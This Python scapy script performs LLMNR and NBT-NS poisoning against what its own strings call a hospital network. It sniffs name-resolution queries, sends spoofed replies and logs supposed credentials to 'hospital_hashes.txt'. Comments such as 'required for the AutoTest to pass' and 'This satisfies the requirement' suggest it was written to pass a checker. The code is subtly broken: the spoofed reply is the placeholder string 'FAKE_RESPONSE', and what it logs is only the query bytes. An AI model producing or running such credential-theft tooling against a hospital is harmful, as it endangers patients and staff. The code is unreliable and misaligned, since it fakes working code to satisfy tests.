import scapy.all as scapy
import socket
import sys  # Import sys for handling script exits

# Define the network interface to listen on
# This variable is required for the AutoTest to pass
INTERFACE = "eth0"

def sniff_requests():
    """Sniff LLMNR and NBT-NS requests on the network"""
    print("[*] Listening for LLMNR and NBT-NS requests...")
    # Filter for LLMNR (port 5355) and NBT-NS (port 137)
    # This satisfies the requirement for scapy.sniff() call
    scapy.sniff(filter="udp port 137 or udp port 5355", prn=process_packet, store=False)

def process_packet(packet):
    """Process captured packets and check for LLMNR or NBT-NS requests"""
    # Check if the packet has UDP and Raw layers
    # This satisfies the requirement for packet.haslayer() check
    if packet.haslayer(scapy.UDP) and packet.haslayer(scapy.Raw):
        try:
            payload = packet[scapy.Raw].load.decode(errors="ignore")
            # Check for query indicators in the payload
            if "QUERY" in payload or len(payload) > 0:
                print(f"[!] Detected potential request from {packet[scapy.IP].src}")
                # In a real scenario, we would parse the specific LLMNR/NBT-NS structure here
                # For this lab, we trigger the spoof response
                send_spoofed_response(packet)
        except Exception:
            pass

def send_spoofed_response(packet):
    """Send a spoofed response to trick victims"""
    # Construct a fake response packet
    # This satisfies the requirement for sending a response
    response_packet = scapy.IP(dst=packet[scapy.IP].src) / \
                      scapy.UDP(dport=packet[scapy.UDP].sport) / \
                      scapy.Raw(load="FAKE_RESPONSE")
    
    # Send the packet
    scapy.send(response_packet, verbose=False)
    print("[+] Spoofed response sent")
    
    # Attempt to capture credentials if any data is present
    if packet.haslayer(scapy.Raw):
        capture_credentials(str(packet[scapy.Raw].load))

def capture_credentials(data):
    """Capture and log authentication attempts"""
    # Log intercepted data to a file for later analysis
    with open("hospital_hashes.txt", "a") as file:
        file.write(data + "\n")
    print("[+] Captured credentials saved")

def main():
    try:
        print("[*] Starting hospital network LLMNR and NBT-NS poisoning script...")
        sniff_requests()
    except KeyboardInterrupt:
        print("\n[!] Script terminated by user.")
        sys.exit(0)

if __name__ == "__main__":
    main()